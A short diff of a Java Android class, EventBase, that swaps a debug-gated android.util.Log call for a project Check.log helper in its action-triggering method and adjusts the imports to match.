@@ -7,12 +7,11 @@
 
 package com.android.service.event;
 
-import android.util.Log;
-
 import com.android.service.Status;
 import com.android.service.ThreadBase;
 import com.android.service.action.Action;
 import com.android.service.auto.Cfg;
+import com.android.service.util.Check;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -56,7 +55,7 @@ public abstract class EventBase extends ThreadBase implements Runnable {
 	
 	protected final void trigger(int actionId) {
 		if (actionId != Action.ACTION_NULL) {
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " event: " + this + " triggering: " + actionId);
+			if(Cfg.DEBUG) Check.log( TAG + " event: " + this + " triggering: " + actionId);
 			Status.self().triggerAction(actionId);
 		}
 	}
